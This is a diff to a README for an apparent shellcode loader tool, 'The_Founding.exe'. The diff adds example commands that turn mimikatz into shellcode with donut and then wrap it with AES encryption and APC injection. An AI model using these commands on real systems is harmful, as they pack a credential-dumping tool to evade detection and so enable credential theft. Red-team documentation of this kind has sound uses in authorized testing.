@@ -35,12 +35,13 @@ Founding.exe <Input Payload FileName> <Enc/Obf *Option*> <Shellcode Execution ty
 
 To help generating shell I added to the release [donut](https://github.com/TheWover/donut), this project will generate .bin shellcode providing .exe binarie that we want to run.
 ```bash
-./donut --input:mimikatz.exe --output:mimi.bin
+donut.exe --input:mimikatz.exe --output:mimi.bin
 ```
 
-## Example Command
+### Example Command
 ```bash
-The_Founding.exe .\calc.bin aes APC --compile
+./donut --input:mimikatz.exe --output:mimi.bin
+The_Founding.exe mimi.bin aes APC --compile
 ```
 
 
